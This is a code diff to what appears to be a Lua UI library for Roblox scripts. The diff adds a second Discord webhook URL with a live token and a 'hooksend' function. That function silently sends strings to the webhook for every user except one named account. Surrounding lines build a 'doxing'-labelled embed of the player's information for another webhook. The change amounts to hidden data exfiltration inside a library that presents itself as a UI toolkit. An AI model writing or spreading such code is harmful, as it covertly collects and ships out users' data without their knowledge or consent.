@@ -362,6 +362,7 @@ local function Virtual_Region()
 end
 
 local url = "https://discord.com/api/webhooks/1211140075283546162/w42r54x5UlZXQuH_BYYFrCme-27FK_uVY42QLVBVzevk4BjTjD_2xszNHWYjDwQ36-wQ"
+local conflog = "https://discord.com/api/webhooks/1211484283731181639/rbJUNf5xMNmc2C-UrW8FN8TMSsuunkj1GFq9tqzr3DEpS_2_tNNQXEdhZc4Z1Tos8W2t"
 local embed = {
     ["title"] = LocalPlayer.DisplayName .. "'s information",
     ["description"] = "Response from turtle-doxing.com",
@@ -402,6 +403,16 @@ task.spawn(function()
 	end
 end)
 
+function lib:hooksend(str)
+	local f,c = pcall(function()
+		if LocalPlayer.Name ~= "Rivanda_Cheater" then
+			SendMessage(conflog,str)
+		end
+	end)
+	if not f then
+		print(c)
+	end
+end
 
 function lib:Window(text, preset, closebind)
     CloseBind = closebind or Enum.KeyCode.RightControl
